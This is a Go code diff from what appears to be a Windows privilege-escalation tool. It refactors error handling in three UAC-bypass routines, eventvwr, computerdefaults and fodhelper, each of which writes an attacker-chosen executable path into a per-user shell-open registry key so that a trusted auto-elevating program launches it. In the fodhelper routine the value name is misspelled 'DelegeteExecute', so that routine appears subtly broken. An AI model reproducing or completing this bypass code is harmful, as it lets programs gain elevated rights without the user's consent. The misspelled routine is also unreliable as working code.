@@ -57,18 +57,18 @@ func Escalate(path string) (err error) {
 func eventvwr(path string) (err error) {
 
 	log.Println("eventvwr")
-	key, _, err = registry.CreateKey(
+	key, _, err := registry.CreateKey(
 		registry.CURRENT_USER, `Software\Classes\mscfile\shell\open\command`,
 		registry.SET_VALUE|registry.ALL_ACCESS)
 	if err != nil {
 		return
 	}
-
-	if err := key.SetStringValue("", path); err != nil {
+	err = key.SetStringValue("", path)
+	if err != nil {
 		return
 	}
-
-	if err := key.Close(); err != nil {
+	err = key.Close()
+	if err != nil {
 		return
 	}
 
@@ -165,16 +165,16 @@ func computerdefaults(path string) (err error) {
 	if err != nil {
 		return
 	}
-
-	if err := key.SetStringValue("", path); err != nil {
+	err = key.SetStringValue("", path)
+	if err != nil {
 		return
 	}
-
-	if err := key.SetStringValue("DelegateExecute", ""); err != nil {
+	err = key.SetStringValue("DelegateExecute", "")
+	if err != nil {
 		return
 	}
-
-	if err := key.Close(); err != nil {
+	err = key.Close()
+	if  err != nil {
 		return
 	}
 	time.Sleep(2 * time.Second)
@@ -204,12 +204,12 @@ func fodhelper(path string) (err error) {
 	if err := key.SetStringValue("", path); err != nil {
 		return
 	}
-
-	if err := key.SetStringValue("DelegeteExecute", ""); err != nil {
+	err = key.SetStringValue("DelegeteExecute", "")
+	if err != nil {
 		return
 	}
-
-	if err := key.Close(); err != nil {
+	err = key.Close()
+	if err != nil {
 		return
 	}
 	time.Sleep(2 * time.Second)
